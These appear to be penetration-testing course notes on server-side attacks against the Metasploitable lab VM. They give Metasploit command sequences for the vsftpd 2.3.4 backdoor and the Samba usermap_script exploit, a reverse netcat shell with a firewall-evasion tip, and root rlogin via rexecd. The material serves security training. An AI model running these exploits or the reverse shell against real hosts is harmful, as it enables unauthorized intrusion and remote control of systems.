# Gaining access — server side attack
-   to test this in VMware, download metasploitable from [this link](https://sourceforge.net/projects/metasploitable/)
    -   login: msfadmin 
    -   pass: msfadmin

-   these attacks don't require user interaction
-   need an IP address of the victim
    -   get ip address of service simply by ping (example: `ping facebook.com`) 

-   <strong>Testing the security of servers is always having these steps:</strong>
    1)  Discover open ports and running services (nmap)
    2)  Find vulnerabilities
    3)  Find exploits
    4)  Exploit/Verify them 
    5)  Report results

## Ways of gaining access:
-   trying default passwords
-   services might be misconfigured
-   scan for vulnerabilities 
    -   To scan for open ports and running services it is possible to use Zenmap/nmap as discussed in chapter 05. After intense scan of IP address scroll to the part with ports (marked green)

## Examples with Metasploitable mentioned above using Metasploit:
-   Metasploit is an exploit development and execution tool included in Kali linux
-   usage:
    -   `msfconsole` : runs metasploit console
    -   `help` : shows help
    -   `show [something]` : something can be exploits, payloads, auxiliaries or options.
    -   `use [something]` : use a certain exploit, payload or auxiliary
    -   `set [option] [value]` : configure option to have a value
    -   `exploit` : tuns the current task

-   On metasploitable which is mentioned at the top. Vulnerabilities like misconfigured ftp (anonymous FTP login allowed, just login through FileZilla without password and username) or includes vsftpd 2.3.4, which has a backdoor (can be found by googling). All can be found with Zenmap with setting intense scan.
-   tip: any vulnerability can be found by service name with version followed by exploit example: `vsftpd 2.3.4 exploit`

### Default password / misconfigured service in Metasploitable
-   it also includes running `netkit-rsh rexecd` on port 512, which allows remote shell connection and execution.
    -   here we can try default login `root`:
```bash
apt-get install rsh-client # first install required tool which can be googled
rlogin -l root 192.168.72.130 # login via installed tool
```

### Backdoors vulnerability in Metasploitable using Zenmap and Metasploit
-   Use Zenmap on the machine running Metasploitable Linux
    1)  Open Zenmap on Kali linux and find Metasplitable linux and all its running services and open ports
    2)  Google vulnerabilities in found services running in open ports (hint:`vsftpd 2.3.4` is the service including the backdoor vulnerability)
    3)  find out (by googling) that the vulnerability is exploitable by meatasploit using it's module `exploit/unix/ftp/vsftpd_234_backdoor` 
-   Open cmd in Kali linux and use msfconsole to exploit the vulnerability:
```bash
msfconsole # run metasploit console
use exploit/unix/ftp/vsftpd_234_backdoor # use the found exploit
show options # show all the options that can be set for the module
set RHOST 192.168.72.130 # set the ip address of the Metasploitable linux
set RPORT 21 # set the port which the service is running on
show options # check if set properly
exploit # exploit the vulnerability
```
-   it will exploit the vulnerability and connect us to the command prompt of the Metasploitable linux

### Code execution vulnerability in Metasploitable using Zenmap and Metasploit
-   as above find vulnerability in service `Samba smbd 3.X - 4.X` and module in Metasploit console
-   this vulnerability isn't connected to backdoor / any code execution
-   it is a vulnerability which allow us to run small pieces of code (payloads)
-   first we need to create payload and run it on the attacked pc. `msfconsole` already includes some
```bash
msfconsole
use exploit/multi/samba/usermap_script
show options
set RHOST 192.168.72.130
show options
show payloads # show available payloads
```
-   shows 2 main types of payloads:
    -   bind: opens port on attacked pc and connects to it
    -   reverse: opens port on our machine and connects the attacked pc to it (might help with bypassing firewall rule for connections to the device)
```bash
set PAYLOAD payload/cmd/unix/reverse_netcat # pick payload
show options # more options will show, connected to picked PAYLOAD
set LHOST 192.168.72.129 # set our machine ip (ifconfig)
set LPORT 4444 # can be set to 80, which is usually never filtered by firewalls
exploit # establishes the connection
```

## Nexpose
-   Vulnerability management Framework for big companies
-   By creating site, it can test the specific IP address or range of addresses in similar way to zenmap. The tests can be scheduled to be run automatically also in intervals. It also shows used software, evaluates damage and attack potential and calculates risk
-   Helps to:
    -   discover open port and running services
    -   find vulnerabilities
    -   find exploits
    -   verify them
    -   generate reports (2 types of reports: technical and high-level report)
    -   automate scans